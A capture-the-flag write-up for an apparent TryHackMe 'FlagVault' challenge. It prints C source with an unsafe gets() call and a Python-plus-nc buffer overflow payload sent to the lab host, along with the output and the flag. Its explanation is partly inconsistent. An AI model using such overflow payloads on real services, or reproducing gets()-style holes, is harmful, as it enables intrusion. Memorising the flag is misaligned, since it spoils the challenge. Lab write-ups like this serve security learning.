# Challenge description

Cipher asked me to create the most secure vault for flags, so I created a vault that cannot be accessed. You don't believe me? Well, here is the code with the password hardcoded. Not that you can do much with it anymore.

nc 10.10.227.201 1337

# Soluce

Here is the code of the vault:

```c
#include <stdio.h>
#include <string.h>

void print_banner(){
        printf( "  ______ _          __      __         _ _   \n"
                " |  ____| |         \\ \\    / /        | | |  \n"
                " | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
                " |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
                " | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
                " |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
                "                  __/ |                      \n"
                "                 |___/                       \n"
                "                                             \n"
                "Version 1.0 - Passwordless authentication evolved!\n"
                "==================================================================\n\n"
              );
}

void print_flag(){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        printf("%s", flag);
}

void login(){
        char password[100] = "";
        char username[100] = "";

        printf("Username: ");
        gets(username);

        // If I disable the password, nobody will get in.
        //printf("Password: ");
        //gets(password);

        if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
                print_flag();
        }
        else{
                printf("Wrong password! No flag for you.");
        }
}

void main(){
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        setvbuf(stderr, NULL, _IONBF, 0);

        // Start login process
        print_banner();
        login();

        return;
}
```

The password is disabled, so we can login without it. We just need to enter the username `bytereaper` and the password `
5up3rP4zz123Byte`. We have to do a buffer overflow to bypass the password check. The password is 100 characters long, so we need to enter 101 characters to overwrite the password. The function `gets` is unsafe, so we can enter more than 100 characters.

At the beginning, we could think that we need to enter the username (10) + 90 characters + the password (15) = 115 characters. But on a 64-bit system, there is an alignement. So we need to enter 101 characters to overwrite the password (we found 101 by testing different values).

The solution is:

```sh
┌──(virgile㉿localhost)-[~/Téléchargements]
└─$ python -c 'print("bytereaper\x00" + "A"*101 + "5up3rP4zz123Byte\x00")' | nc 10.10.227.201 1337                                                                                                                                         
  ______ _          __      __         _ _   
 |  ____| |         \ \    / /        | | |  
 | |__  | | __ _  __ \ \  / /_ _ _   _| | |_ 
 |  __| | |/ _` |/ _` \ \/ / _` | | | | | __|
 | |    | | (_| | (_| |\  / (_| | |_| | | |_ 
 |_|    |_|\__,_|\__, | \/ \__,_|\__,_|_|\__|
                  __/ |                      
                 |___/                       
                                             
Version 1.0 - Passwordless authentication evolved!
==================================================================

Username: THM{password_0v3rfl0w}
```

So the flag is `THM{password_0v3rfl0w}`.